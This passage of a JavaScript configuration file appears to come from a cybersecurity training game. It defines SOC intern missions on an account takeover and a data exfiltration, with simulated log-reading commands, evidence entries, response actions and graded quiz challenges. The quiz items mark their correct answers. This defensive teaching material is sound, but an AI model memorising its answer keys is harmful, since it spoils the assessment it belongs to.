            why: 'Altering these settings strips the account\u2019s defences and cements the takeover.' } },
        { a: 'attacker', b: 'lockout', revealBy: 'ev_reset', danger: true,
          intel: {
            what: 'The intruder reset the account password from its own address, locking the real owner out.',
            technique: 'grep password_reset user_access.log — reset issued from 203.0.113.44 (Lagos).',
            why: 'A password reset from the attacker\u2019s location is persistence — the owner can no longer get back in.' } },
        { a: 'account', b: 'finance_data', revealBy: 'ev_access', danger: true,
          intel: {
            what: 'After the takeover the account opened payroll and customer-payment data and downloaded a compensation file.',
            technique: 'cat user_access.log — sensitive Finance reads plus a q3_compensation.csv download.',
            why: 'It shows the attacker using the trusted account to reach exactly the sensitive data that matters.' } },
        { a: 'attacker', b: 'contractor', revealBy: 'ev_contractor_tie', danger: true,
          intel: {
            what: 'The attacking address traces back to the recurring contractor whose own account was disabled.',
            technique: 'cat contractor_activity.log — src 203.0.113.44 maps to ext-contractor-07 (J. Demir).',
            why: 'It ties this takeover to the earlier cases — the same actor escalating rather than a stranger.' } },
      ],
    },

    intro: [
      { t: 'CyberCorp SOC // Career Operating Center — Authentication Review', c: 'head' },
      { t: 'The login system flagged a burst of failed sign-ins followed by a success.', c: 'dim' },
      { t: 'Read the logs, work out what happened, and find the account that was taken over.', c: 'dim' },
      { t: 'Type  cat auth.log  to start, then  help  for the full command list.', c: 'dim' },
    ],
    brief: {
      situation:
        'Overnight, the authentication system flagged an unusual pattern on a Finance ' +
        'account: a wave of failed logins, then a success — from a place the user has ' +
        'never signed in from. Read the authentication logs, reconstruct what happened ' +
        'in order, decide whether this is a real account takeover, and identify exactly ' +
        'which account is compromised.',
      objectives: [
        'Reconstruct the login pattern from the authentication logs',
        'Check where the successful login came from',
        'Look for changes made to the account after the login',
        'Identify the compromised account — then recommend a response',
      ],
      managerNote:
        '"Same Finance name from your first case — A. Okafor. Could be nothing, could be ' +
        'someone reusing what they learned. Read the logs in order: failures, success, ' +
        'then what they did next. Recommend the response; you don'+"'"+'t reset credentials ' +
        'org-wide yourself. — Sarah Reyes, SOC Lead"',
    },

    commandBriefs: true,  // Guided Terminal: brief grep/tail here if not already seen in M2
    commands: [
      {
        id: 'cat_authlog',
        match: ['cat auth.log', 'cat authlog', 'less auth.log'],
        help: 'read the authentication log',
        core: true,
        output: [
          { t: 'auth.log — last 24h (summary)', c: 'head' },
          '  03:11  a.okafor   LOGIN FAILED   src 203.0.113.44',
          '  03:11  a.okafor   LOGIN FAILED   src 203.0.113.44',
          '  03:12  a.okafor   LOGIN FAILED   src 203.0.113.44',
          '  ... (many more failures) ...',
          '  03:19  a.okafor   LOGIN SUCCESS  src 203.0.113.44',
        ],
        reveals: ['ev_overview'],
        observation: 'One account — a.okafor — shows a stack of failed logins and then a success, all from the same outside address.',
        question: 'Many failures, then a success, all from one source — what does that pattern usually mean?',
        next: 'count the failures on their own — type  grep failed auth.log',
      },
      {
        id: 'grep_failed',
        match: ['grep failed auth.log', 'grep failed', 'grep failed auth'],
        help: 'show only the failed login attempts',
        core: true,
        output: [
          { t: 'grep failed auth.log — a.okafor', c: 'head' },
          '  47 LOGIN FAILED entries for a.okafor between 03:11 and 03:18',
          '  all from src 203.0.113.44 (single external address)',
        ],
        reveals: ['ev_failures'],
        observation: '47 failed attempts in seven minutes from one address — far too fast and too many for a human typo.',
        question: 'Does a person fail to log in 47 times in seven minutes? Or is something automated?',
        next: 'find the one that worked — type  grep successful auth.log',
      },
      {
        id: 'grep_successful',
        match: ['grep successful auth.log', 'grep success auth.log', 'grep successful'],
        help: 'show the successful logins',
        core: true,
        output: [
          { t: 'grep successful auth.log — a.okafor', c: 'head' },
          '  03:19  a.okafor   LOGIN SUCCESS  src 203.0.113.44',
          '  # the success comes immediately after the 47 failures, same source',
        ],
        reveals: ['ev_success'],
        observation: 'The successful login lands seconds after the failed burst, from the very same address — the guessing worked.',
        question: 'If the failures were an attacker guessing, who just got in?',
        next: 'see where that login came from — type  cat login_locations.log',
      },
      {
        id: 'cat_locations',
        match: ['cat login_locations.log', 'cat login_locations', 'less login_locations.log'],
        help: 'read the login-location history',
        core: true,
        output: [
          { t: 'login_locations.log — a.okafor', c: 'head' },
          '  usual:   London, UK (office) — every prior login',
          '  03:19:   Lagos, NG — NEW location, never seen before',
          '  # 03:05 a.okafor also had a normal London session open at the same time',
        ],
        reveals: ['ev_location'],
        observation: 'The successful login came from a country a.okafor has never signed in from — while a normal London session was already active.',
        question: 'One person cannot be in two countries at once — so who is the second login?',
        next: 'focus the location log on the odd one — type  grep unknown login_locations.log',
      },
      {
        id: 'grep_unknown',
        match: ['grep unknown login_locations.log', 'grep unknown', 'grep unknown login_locations'],
        help: 'highlight the unrecognized location',
        output: [
          'login_locations.log:  03:19  a.okafor  Lagos, NG  device: unknown  status: UNRECOGNIZED',
          'login_locations.log:  note: ~5,000 km from the active London session 14 minutes earlier',
        ],
        reveals: ['ev_impossible'],
        observation: 'The two sessions are thousands of kilometres apart, minutes apart — physically impossible for one person.',
        question: 'What does it tell you when one account is logged in from two impossible places at once?',
        next: 'see what changed on the account after they got in — type  cat account_changes.log',
      },
      {
        id: 'cat_changes',
        match: ['cat account_changes.log', 'cat account_changes', 'less account_changes.log'],
        help: 'read changes made to the account',
        core: true,
        output: [
          { t: 'account_changes.log — a.okafor (after 03:19)', c: 'head' },
          '  03:21  MFA DISABLED            by a.okafor (src 203.0.113.44)',
          '  03:22  mail forwarding ADDED   → external address',
          '  03:24  password CHANGED        (src 203.0.113.44)',
        ],
        reveals: ['ev_changes'],
        observation: 'Right after logging in, "a.okafor" turned off MFA, added mail forwarding, and changed the password — classic takeover housekeeping.',
        question: 'Why would the real owner disable their own MFA and forward their mail at 3am?',
        next: 'confirm MFA is now off — type  cat mfa_status.txt',
      },
      {
        id: 'cat_mfa',
        match: ['cat mfa_status.txt', 'cat mfa_status', 'less mfa_status.txt'],
        help: 'check the current MFA status',
        output: [
          { t: 'mfa_status.txt — a.okafor', c: 'head' },
          '  MFA: DISABLED  (was ENABLED until 03:21 today)',
          '  # with MFA off, only the now-changed password protects the account',
        ],
        reveals: ['ev_mfa_off'],
        observation: 'MFA is currently OFF — the one control that would have blocked a stolen password has been removed.',
        question: 'With MFA off and the password changed, who actually controls this account now?',
        next: 'see what the account touched after takeover — type  cat user_access.log',
      },
      {
        id: 'cat_access',
        match: ['cat user_access.log', 'cat user_access', 'less user_access.log'],
        help: 'read what the account accessed',
        core: true,
        output: [
          { t: 'user_access.log — a.okafor (after 03:19)', c: 'head' },
          '  03:26  opened  finance_share/payroll/',
          '  03:28  opened  finance_share/customer_payments/',
          '  03:31  downloaded  q3_compensation.csv',
        ],
        reveals: ['ev_access'],
        observation: 'The compromised account went straight for payroll and customer-payment data — the same sensitive finance files from your first case.',
        question: 'The attacker is now inside Finance with a trusted account — what is at stake?',
        next: 'check who reset the password — type  grep password_reset user_access.log',
      },
      {
        id: 'grep_reset',
        match: ['grep password_reset user_access.log', 'grep password_reset', 'grep password_reset user_access'],
        help: 'search for the password reset event',
        output: [
          'user_access.log:  03:24  password_reset  performed from src 203.0.113.44 (Lagos, NG)',
          'user_access.log:  # the attacker, not the user, now holds the working password',
        ],
        reveals: ['ev_reset'],
        observation: 'The password was reset from the attacker'+"'"+'s address — the real owner is now locked out of their own account.',
        question: 'If the attacker reset the password, will the real user even notice they are locked out?',
        next: 'trace the source address — type  cat contractor_activity.log',
      },
      {
        id: 'cat_contractor',
        match: ['cat contractor_activity.log', 'cat contractor_activity', 'less contractor_activity.log'],
        help: 'read the contractor activity log',
        core: true,
        output: [
          { t: 'contractor_activity.log', c: 'head' },
          '  src 203.0.113.44 previously seen: ext-contractor-07 (J. Demir) remote sessions',
          '  contractor01 (J. Demir) account: DISABLED after the data-handling review',
          '  # same source address as the earlier contractor incidents',
        ],
        reveals: ['ev_contractor_tie'],
        observation: 'The attacking address traces back to the same contractor flagged in your earlier cases — whose own account was already disabled, so they pivoted to a.okafor.',
        question: 'A blocked contractor reappears by stealing a Finance login — is this opportunism, or a campaign?',
        next: 'check the policy for this pattern — type  cat authentication_policy.txt',
      },
      {
        id: 'cat_policy',
        match: ['cat authentication_policy.txt', 'cat authentication_policy', 'less authentication_policy.txt'],
        help: 'read the authentication policy',
        output: [
          { t: 'authentication_policy.txt', c: 'head' },
          '  Repeated failures + login from a new location + MFA change = treat as COMPROMISE.',
          '  Response: reset credentials, re-enable MFA, lock if needed, and escalate to IR.',
        ],
        reveals: ['ev_policy'],
        observation: 'Policy says this exact pattern is treated as a confirmed compromise — with a defined response.',
        question: 'You have the pattern and the policy — what is the right response to protect the account?',
        next: 'see the correlated alert — type  tail security_events.log',
      },
      {
        id: 'tail_security',
        match: ['tail security_events.log', 'cat security_events.log', 'less security_events.log'],
        help: 'read the correlated security alert',
        core: true,
        output: [
          { t: 'security_events.log — correlated', c: 'head' },
          '  ALERT: credential brute-force → success → MFA tamper on a.okafor',
          '  confidence: HIGH   recommended: contain account, reset, escalate to IR',
        ],
        reveals: ['ev_correlated'],
        observation: 'The system has already correlated the whole chain into a single high-confidence account-compromise alert.',
        question: 'The evidence all points one way — are you ready to name the account and act?',
        next: 'confirm the user could not have done this — type  cat manager_notes.txt',
      },
      {
        id: 'cat_manager',
        match: ['cat manager_notes.txt', 'cat manager_notes', 'less manager_notes.txt'],
        help: 'read the manager'+"'"+'s notes',
        output: [
          { t: 'manager_notes.txt', c: 'head' },
          '  "A. Okafor is on leave this week and is in London — definitely did not log in from Lagos."',
          '  "She never disables her MFA. Please treat this as not her."',
        ],
        reveals: ['ev_manager'],
        observation: 'The manager confirms the real owner was elsewhere and would never disable MFA — ruling out a legitimate explanation.',
        question: 'With the owner ruled out, the only explanation left is takeover — what do you recommend?',
        next: 'you have the full picture — type  decide  to choose your response',
      },
    ],

    evidence: [
      {
        id: 'ev_overview', label: 'One account shows failed logins then a success, all from one outside address.',
        qualityWeight: 1, source: 'auth.log',
        layers: {
          beginner: {
            summary: 'The log shows one account failing to log in many times, then succeeding — all from the same outside address.',
            why: 'A burst of failures followed by a success is a common sign someone is guessing a password.',
            prompt: 'Many failures then a success from one source — what does that usually mean?',
          },
          analyst: 'auth.log: a.okafor — clustered LOGIN FAILED then LOGIN SUCCESS, single external src 203.0.113.44.',
          technical: 'auth.log — a.okafor failed-auth cluster culminating in success, src 203.0.113.44 throughout.',
          terms: ['authentication'],
        },
      },
      {
        id: 'ev_failures', label: '47 failed logins in 7 minutes from one external address.',
        qualityWeight: 3, source: 'grep failed auth.log',
        layers: {
          beginner: {
            summary: 'The account failed to log in 47 times in just seven minutes, all from one outside address.',
            why: 'No person types their password wrong 47 times that fast — this is automated guessing.',
            prompt: 'Does a real person fail 47 times in seven minutes, or is this a machine?',
          },
          analyst: '47 failed auths for a.okafor in ~7 min from 203.0.113.44 — high-rate credential brute-force.',
          technical: 'grep failed auth.log — 47 failures 03:11–03:18, single src 203.0.113.44; automated brute-force signature.',
          terms: ['bruteForce', 'authentication'],
        },
      },
      {
        id: 'ev_success', label: 'A login succeeded immediately after the failed burst, same source.',
        qualityWeight: 2, source: 'grep successful auth.log',
        layers: {
          beginner: {
            summary: 'Right after all those failures, one login finally worked — from the same outside address.',
            why: 'A success at the end of a guessing burst means the attacker found the password.',
            prompt: 'If the failures were guessing, who just successfully got in?',
          },
          analyst: 'Successful auth at 03:19 immediately follows the failure cluster, same src — brute-force succeeded.',
          technical: 'grep successful auth.log — 03:19 SUCCESS, src 203.0.113.44; terminal success of the brute-force run.',
          terms: ['bruteForce'],
        },
      },
      {
        id: 'ev_location', label: 'The successful login came from a location the user has never used.',
        qualityWeight: 3, source: 'login_locations.log',
        layers: {
          beginner: {
            summary: 'The login that worked came from a country the user has never signed in from before.',
            why: 'A first-ever login location, at the exact moment of a break-in, points to someone else.',
            prompt: 'One person cannot be in two countries at once — so who is the second login?',
          },
          analyst: 'a.okafor habitual geo = London; 03:19 success geolocates to Lagos, NG — novel location during an active London session.',
          technical: 'login_locations.log — anomalous geo (Lagos, NG) vs baseline (London); concurrent London session present.',
          terms: ['authentication'],
        },
        reflection: {
          title: 'REVIEW THE SUSPICIOUS LOGIN',
          prompt: 'What concerns you about this activity? (Tick anything that stands out.)',
          concerns: [
            'Dozens of failed logins in a few minutes',
            'A success right after the failures, from the same address',
            'The login came from a location the user has never used',
            'The account is logged in from two places at once',
            'This looks like the user just travelling',
            'I need more information before deciding',
          ],
          judgmentPrompt: 'Based on what you found, how would you judge this activity?',
          feedback: 'There is no single right answer — analysts reason from what they observe. The PATTERN (failures → success), the PLACE (a new country), and the TIMING (two places at once) together make the case.',
        },
      },
      {
        id: 'ev_impossible', label: 'Two sessions thousands of km apart, minutes apart — physically impossible.',
        qualityWeight: 2, source: 'grep unknown login_locations.log',
        layers: {
          beginner: {
            summary: 'The account was logged in from two places thousands of kilometres apart, only minutes apart.',
            why: 'No one can travel that far that fast — so the two logins are two different people.',
            prompt: 'What does it mean when one account is in two impossible places at once?',
          },
          analyst: 'Impossible-travel: ~5,000 km between concurrent London and Lagos sessions, ~14 min apart.',
          technical: 'login_locations.log — geo-velocity violation (London↔Lagos, ~14 min); concurrent-session anomaly.',
          terms: ['impossibleTravel'],
        },
      },
      {
        id: 'ev_changes', label: 'After login, MFA was disabled, mail forwarding added, and the password changed.',
        qualityWeight: 3, source: 'account_changes.log',
        layers: {
          beginner: {
            summary: 'Right after logging in, the account turned off its security check, set up mail forwarding, and changed its password.',
            why: 'These are the moves an attacker makes to keep control and hide — not what an owner does at 3am.',
            prompt: 'Why would the real owner disable their own MFA and forward their mail in the middle of the night?',
          },
          analyst: 'Post-auth: MFA disabled, external mail-forward rule added, password rotated — attacker persistence + exfil setup.',
          technical: 'account_changes.log — 03:21 MFA off, 03:22 forward→external, 03:24 password change, all src 203.0.113.44.',
          terms: ['mfa', 'credentialCompromise'],
        },
      },
      {
        id: 'ev_mfa_off', label: 'MFA is now OFF — it was enabled until the attack.',
        qualityWeight: 2, source: 'mfa_status.txt',
        layers: {
          beginner: {
            summary: 'The account'+"'"+'s extra security check is now switched off; it was on until this happened.',
            why: 'With MFA off, only the password protects the account — and the attacker just changed that too.',
            prompt: 'With MFA off and the password changed, who actually controls this account now?',
          },
          analyst: 'a.okafor MFA state flipped ENABLED→DISABLED at 03:21; sole remaining factor (password) attacker-controlled.',
          technical: 'mfa_status.txt — MFA DISABLED (since 03:21); single-factor exposure post-takeover.',
          terms: ['mfa'],
        },
      },
      {
        id: 'ev_access', label: 'The account then opened payroll and customer-payment data and downloaded a file.',
        qualityWeight: 3, source: 'user_access.log',
        layers: {
          beginner: {
            summary: 'After the break-in, the account opened payroll and customer-payment files and downloaded one.',
            why: 'These are the same sensitive finance files from your first case — now in an attacker'+"'"+'s hands.',
            prompt: 'The attacker is inside Finance with a trusted account — what is at stake?',
          },
          analyst: 'Post-compromise access to finance_share payroll + customer_payments; exfil of q3_compensation.csv.',
          technical: 'user_access.log — 03:26–03:31 sensitive finance reads + download (q3_compensation.csv) under compromised account.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_reset', label: 'The password was reset from the attacker'+"'"+'s address — owner locked out.',
        qualityWeight: 2, source: 'grep password_reset user_access.log',
        layers: {
          beginner: {
            summary: 'The password was reset from the attacker'+"'"+'s location, so the real owner is now locked out.',
            why: 'Changing the password is how the attacker keeps control and stops the owner getting back in.',
            prompt: 'If the attacker reset the password, will the real user even notice they are locked out?',
          },
          analyst: 'password_reset executed from 203.0.113.44 (Lagos) — attacker secures persistence, denies legitimate access.',
          technical: 'grep password_reset user_access.log — reset from attacker src; owner lockout, attacker persistence.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_contractor_tie', label: 'The attacking address traces back to the recurring contractor (J. Demir).',
        qualityWeight: 3, source: 'contractor_activity.log', setFlag: 'contractorAccountCompromised',
        layers: {
          beginner: {
            summary: 'The attacker'+"'"+'s address is the same one tied to the contractor from your earlier cases — whose own account was already disabled.',
            why: 'A blocked contractor stealing a Finance login suggests this is the same person escalating, not a random attacker.',
            prompt: 'A blocked contractor reappears through a stolen login — opportunism, or a campaign?',
          },
          analyst: 'src 203.0.113.44 historically maps to ext-contractor-07 (J. Demir); contractor01 disabled — pivot to a.okafor.',
          technical: 'contractor_activity.log — 203.0.113.44 ↔ ext-contractor-07 prior sessions; disabled contractor account → credential pivot.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_policy', label: 'Policy treats failures + new location + MFA change as a confirmed compromise.',
        qualityWeight: 1, source: 'authentication_policy.txt',
        layers: {
          beginner: {
            summary: 'The rules say this exact combination of signs is treated as a real account takeover.',
            why: 'Knowing the policy turns the pattern you found into a clear, required response.',
            prompt: 'You have the pattern and the policy — what response protects the account?',
          },
          analyst: 'Auth policy: brute-force + new-geo + MFA change = compromise; mandates reset, MFA re-enable, lock, IR escalation.',
          technical: 'authentication_policy.txt — defined compromise criteria + response (credential reset, MFA enforce, lock, escalate).',
          terms: ['authentication', 'mfa'],
        },
      },
      {
        id: 'ev_correlated', label: 'The SIEM correlated the whole chain into one high-confidence compromise alert.',
        qualityWeight: 2, source: 'security_events.log', setFlag: 'credentialRiskHigh',
        layers: {
          beginner: {
            summary: 'The security system has already linked all the steps into a single high-confidence takeover alert.',
            why: 'Independent confirmation that the separate clues add up to one account-compromise incident.',
            prompt: 'The evidence all points one way — are you ready to name the account and act?',
          },
          analyst: 'Correlated alert: brute-force → success → MFA tamper on a.okafor, HIGH confidence; recommends contain + reset + IR.',
          technical: 'security_events.log — multi-signal correlation (auth + geo + MFA) → HIGH-confidence account-compromise.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_manager', label: 'The manager confirms the owner was elsewhere and never disables MFA.',
        qualityWeight: 1, source: 'manager_notes.txt',
        layers: {
          beginner: {
            summary: 'The manager confirms the real owner was on leave in London and would never turn off her MFA.',
            why: 'This rules out an innocent explanation — the activity cannot be the legitimate user.',
            prompt: 'With the owner ruled out, the only explanation left is takeover — what do you recommend?',
          },
          analyst: 'Manager attestation: owner in London/on leave, no self-initiated MFA disable — legitimate-use hypothesis excluded.',
          technical: 'manager_notes.txt — owner alibi + behavioral baseline contradict the session; confirms unauthorized actor.',
          terms: [],
        },
      },
    ],

    actions: [
      {
        id: 'lock_account',
        type: 'recommendation',
        label: 'Recommend Account Lock',
        summary: 'Recommend immediately locking the compromised account to cut off the attacker.',
        outcomeSub: 'You recommended locking the compromised account.',
        deltas: { securityPosture: 18, complianceExposure: -12, businessContinuity: -6, executiveTrust: 8, careerReputation: 10 },
        setFlags: ['credentialRiskHigh'],
        deniedNote: 'Leadership held off on locking the account pending firmer confirmation it is compromised.',
        consequence: {
          immediate: ['The account is locked; the attacker'+"'"+'s session is cut off and further finance access stops.'],
          business: ['The real owner is briefly locked out until identity is re-verified — minor friction, major exposure avoided.'],
          future: ['Fast containment of a live compromise strengthens your standing on later incidents.'],
        },
      },
      {
        id: 'recommend_reset',
        type: 'recommendation',
        label: 'Recommend Password Reset',
        summary: 'Recommend forcing a password reset on the compromised account.',
        outcomeSub: 'You recommended a forced password reset.',
        deltas: { securityPosture: 12, complianceExposure: -8, careerReputation: 6, executiveTrust: 5, businessContinuity: -3 },
        setFlags: ['credentialRiskHigh'],
        deniedNote: 'Leadership wanted the account contained first before a reset is issued.',
        consequence: {
          immediate: ['A forced reset invalidates the attacker'+"'"+'s changed password and starts recovery.'],
          business: ['Owner regains access through a verified reset; a reset alone, without a lock, may leave a window open.'],
          future: ['Correct first move, recorded for the incident timeline.'],
        },
      },
      {
        id: 'enforce_mfa',
        type: 'recommendation',
        label: 'Recommend MFA',
        summary: 'Recommend re-enabling and enforcing MFA on the account.',
        outcomeSub: 'You recommended re-enabling and enforcing MFA.',
        deltas: { securityPosture: 14, complianceExposure: -10, careerReputation: 8, executiveTrust: 6, businessContinuity: -2 },
        setFlags: ['mfaRecommended'],
        deniedNote: 'Leadership noted MFA enforcement but wanted the account contained first.',
        consequence: {
          immediate: ['MFA is re-enabled, restoring the second factor the attacker had stripped off.'],
          business: ['Re-enforcing MFA blocks repeat takeover even if the password leaks again.'],
          future: ['MFA enforcement on record — a durable fix carried into later missions.'],
        },
      },
      {
        id: 'escalate',
        type: 'recommendation',
        label: 'Escalate Incident',
        summary: 'Escalate the confirmed compromise to the incident-response team.',
        outcomeSub: 'You escalated the incident to IR.',
        deltas: { executiveTrust: 10, careerReputation: 8, securityPosture: 4, complianceExposure: -6, businessContinuity: -2 },
        setFlags: ['credentialRiskHigh'],
        deniedNote: 'Leadership sent it back — they want a clear containment recommendation alongside the escalation.',
        consequence: {
          immediate: ['Incident handed to the IR team with the full authentication timeline and contractor link.'],
          business: ['Senior responders own the broader investigation into the contractor campaign.'],
          future: ['Escalating a real compromise with solid evidence builds serious trust.'],
        },
      },
      {
        id: 'continue_investigation',
        type: 'direct',
        label: 'Continue Investigation',
        summary: 'Hold off on a response and keep gathering information.',
        outcomeSub: 'You chose to continue investigating before acting.',
        deltas: { securityPosture: -8, complianceExposure: 8, businessContinuity: 1, careerReputation: -4 },
        setFlags: ['credentialRiskHigh'],
        consequence: {
          immediate: ['No containment yet; the attacker keeps access to the Finance account while you gather more.'],
          business: ['The evidence already confirms compromise — delay lets the attacker dig deeper into finance data.'],
          future: ['Hesitating on a live, confirmed takeover is noted as a costly delay.'],
        },
      },
      {
        id: 'ignore',
        type: 'direct',
        label: 'Ignore Alert',
        summary: 'Treat it as a false alarm and close the alert.',
        outcomeSub: 'You dismissed the alert.',
        deltas: { securityPosture: -22, complianceExposure: 28, businessContinuity: 2, careerReputation: -18, executiveTrust: -18 },
        setFlags: ['credentialRiskHigh'],
        consequence: {
          immediate: ['The attacker keeps full control of a Finance account with MFA off and finance data exposed.'],
          business: ['An active, confirmed account compromise is left running — a serious, escalating breach.'],
          future: ['Dismissing a live compromise is a severe blow to trust in your judgment.'],
        },
      },
    ],

    lockedActions: [
      {
        id: 'orgwide_reset',
        label: 'Force Org-Wide Credential Reset',
        reason: 'Cybersecurity Interns cannot trigger a company-wide password reset. That is an IAM Administrator decision.',
        alternativeRecommendationId: 'rec_orgwide_reset',
      },
      {
        id: 'revoke_contractor',
        label: 'Revoke Contractor Access Domain-Wide',
        reason: 'Interns cannot revoke a contractor'+"'"+'s access across the domain. Route this through your SOC Lead and IAM.',
        alternativeRecommendationId: 'rec_contractor_revoke',
      },
    ],

    recommendations: {
      rec_orgwide_reset: {
        label: 'Org-Wide Credential Reset',
        deltas: { securityPosture: 12, complianceExposure: -8, careerReputation: 6, businessContinuity: -5 },
        setFlags: ['credentialRiskHigh'],
        deniedNote: 'Leadership declined an org-wide reset without evidence the compromise spread further.',
        consequence: {
          immediate: ['Requested a broader credential reset in case other accounts were guessed.'],
          business: ['Wider reset causes some disruption but closes any shared-password exposure.'],
          future: ['A documented containment decision carried into later missions.'],
        },
      },
      rec_contractor_revoke: {
        label: 'Contractor Access Revocation',
        deltas: { securityPosture: 10, executiveTrust: 6, careerReputation: 8, complianceExposure: -6 },
        setFlags: ['contractorAccountCompromised'],
        deniedNote: 'Leadership deferred a domain-wide contractor revocation pending IR review.',
        consequence: {
          immediate: ['Requested full revocation of the contractor'+"'"+'s remaining access across the domain.'],
          business: ['Cuts off the recurring contractor as a source of further incidents.'],
          future: ['Closing out the contractor thread reduces risk in later missions.'],
        },
      },
    },
  },

  /* ================================================================== *
   * MISSION 4 — DATA EXFILTRATION INVESTIGATION (CRITICAL capstone)
   * ------------------------------------------------------------------
   * The career-sim capstone. Same command-model engine as M2/M3:
   * reconstruct a four-step timeline (login -> file access -> archive
   * creation -> data transfer), make a single root-cause determination,
   * then choose an incident response. Its HEADLINE feature is
   * `dynamicConditions`: carry-flags set (but until now never consumed)
   * by Assignments 001/002/003 reshape this case — adding evidence,
   * commands, risks, brief "case continuity" lines, debrief outcome
   * notes, and post-hoc resource deltas. See career-dynamic.js.
   * ================================================================== */
  'mission-004': {
    id: 'mission-004',
    investigationFeed: true, // Active Investigation Feed (data-driven from discoveryChallenges).
    /* Two-step Analyst Judgment Engine — see Mission 1 for the schema. Authored on
     * existing evidence ids; boardMilestones auto-open the network map once each. */
    caseFileNotebook: true,
    // Pacing beat (shared with Mission 1; see reviewGateMode): show a "read what
    // came up, then continue" step before Sarah's graded call so the just-printed
    // terminal output stays visible. Presentation/sequencing only — never grades.
    reviewBeforeCall: true,
    boardMilestones: ['ev_transfer', 'ev_external_dest'],
    discoveryChallenges: [
      {
        id: 'ch_m4_transfer', evidenceId: 'ev_transfer', short: 'Data movement', weight: 1,
        observation: {
          prompt: 'You trace the customer archive. What stands out about where it went?',
          correct: 'a',
          options: [
            { id: 'a', label: 'It was uploaded to an address outside the company',
              feedback: '"Yes — data leaving the perimeter is the moment a risk becomes a breach. Good catch." — Sarah Reyes' },
            { id: 'b', label: 'The archive was compressed',
              feedback: '"Compression is normal for transfers. The standout is that it went OUTSIDE the company." — Sarah Reyes' },
            { id: 'c', label: 'It was created late at night',
              feedback: '"Timing is secondary. The decisive fact is the upload to an external address." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'Why does an outbound upload of this archive matter?',
          correct: 'a',
          options: [
            { id: 'a', label: 'Customer data has left our control — this is an actual breach, not just risk',
              feedback: '"Exactly — once regulated data leaves the building, we are in breach response, not prevention." — Sarah Reyes' },
            { id: 'b', label: 'External backups are good practice',
              feedback: '"This is no sanctioned backup. An unapproved upload of the customer database is exfiltration." — Sarah Reyes' },
            { id: 'c', label: 'The partner probably requested it',
              feedback: '"We cannot assume that, and no request justifies the full customer DB leaving. Treat it as a breach." — Sarah Reyes' },
          ],
        },
      },
      {
        id: 'ch_m4_dest', evidenceId: 'ev_external_dest', short: 'Exfil destination', weight: 2,
        observation: {
          prompt: 'You examine the upload destination. What stands out about it?',
          correct: 'a',
          options: [
            { id: 'a', label: 'It is an unknown external host, not a known partner system',
              feedback: '"Right — an unrecognised external endpoint is the hallmark of attacker-controlled infrastructure." — Sarah Reyes' },
            { id: 'b', label: 'It is located in the LATAM region',
              feedback: '"Region alone is not damning — plenty of legitimate systems live there. The standout is that the host is UNKNOWN." — Sarah Reyes' },
            { id: 'c', label: 'It responded quickly',
              feedback: '"Latency is irrelevant. What matters is that the destination is an unknown external host." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'How should you judge this exfiltration?',
          correct: 'malicious',
          options: [
            { id: 'malicious', label: 'Malicious — confirmed exfiltration to attacker infrastructure; escalate to IR now',
              feedback: '"Agreed — the full customer DB to an unknown external host is a confirmed exfil. Escalate to incident response now." — Sarah Reyes' },
            { id: 'suspicious', label: 'Suspicious — keep monitoring before acting',
              feedback: '"Monitoring wastes time we do not have. A confirmed upload of the customer DB to an unknown host demands escalation now." — Sarah Reyes' },
            { id: 'benign', label: 'Benign — likely a misconfigured backup job',
              feedback: '"A backup job does not target an unknown external host with the entire customer database. This is exfiltration." — Sarah Reyes' },
          ],
        },
      },
    ],
    opId: 'OPS-2026-004',
    severity: 'CRITICAL',
    region: 'LATAM REGION',
    title: 'Investigate a Data Exfiltration Incident',
    threatClass: 'Incident Response & Data Exfiltration',
    priority: 'P1 — CRITICAL',
    promptLabel: 'intern@cybercorp:~/incident$',
    carryFlags: [
      { key: 'dataExfiltrationConfirmed',     label: 'Customer-data exfiltration confirmed on record' },
      { key: 'exfilContained',                label: 'Exfiltration channel contained' },
      { key: 'incidentResponseEscalated',     label: 'Incident escalated to the IR team' },
      { key: 'customerNotificationRecommended', label: 'Customer breach notification recommended' },
    ],
    supervisorMemory: [
      { when: { allOf: ['contractorAccountCompromised'] }, tone: 'bad',
        text: "The contractor account you flagged as compromised last case — this breach almost certainly runs straight through it. Confirm the link." },
      { when: { allOf: ['mfaRecommended'] }, tone: 'good',
        text: "Your MFA recommendation is a big reason we caught this in time. Good instinct — now finish what you started." },
      { when: { allOf: ['rogueDeviceActive'] }, tone: 'bad',
        text: "That device you left active two cases ago may be how they kept their quiet way in long enough to pull this off." },
      { when: { allOf: ['legalReviewTriggered'] }, tone: 'good',
        text: "Legal has been tracking this contractor since your very first case, thanks to you. That trail matters now." },
      { when: { allOf: ['contractorAccessIgnored'], noneOf: ['legalReviewTriggered'] }, tone: 'warn',
        text: "We never fully reviewed that contractor's access back on case one. We're paying for it now — get this one exactly right." },
    ],
    notebook: {
      facts: [
        { label: 'A Finance account signed in outside normal working hours.', confirmedBy: ['ev_login'] },
        { label: 'The session traces back to the previously flagged contractor.', confirmedBy: ['ev_contractor_src'] },
        { label: 'The full customer database was read and bundled into a single archive.', confirmedBy: ['ev_archive', 'ev_customer_db'] },
        { label: 'The archive was transferred to an external destination.', confirmedBy: ['ev_external_dest', 'ev_transfer'] },
      ],
      hypotheses: [
        { label: 'This is deliberate data exfiltration, not a routine bulk export.', triggeredBy: ['ev_history', 'ev_dlp'] },
        { label: 'The exfil used the compromised account from the takeover case.', triggeredBy: ['ev_contractor_src', 'ev_login'] },
        { label: 'The whole customer database was staged into one archive for removal.', triggeredBy: ['ev_archive', 'ev_customer_db'] },
        { label: 'The data was shipped to an attacker-controlled external destination.', triggeredBy: ['ev_external_dest', 'ev_transfer'] },
      ],
      unknowns: [
        { label: 'How much customer data actually left the building?', resolvedBy: ['ev_volume'] },
        { label: 'Which endpoint built and uploaded the archive?', resolvedBy: ['ev_endpoint'] },
        { label: 'Does the loss cross the regulatory breach-notification threshold?', resolvedBy: ['ev_legal'] },
      ],
      recommendations: [
        { label: 'Escalate to the incident response team.', doneBy: ['incidentResponseEscalated'] },
        { label: 'Contain the external data-transfer channel.', doneBy: ['exfilContained'] },
        { label: 'Recommend customer breach notification.', doneBy: ['customerNotificationRecommended'] },
        { label: 'Confirm the data exfiltration on the record.', doneBy: ['dataExfiltrationConfirmed'] },
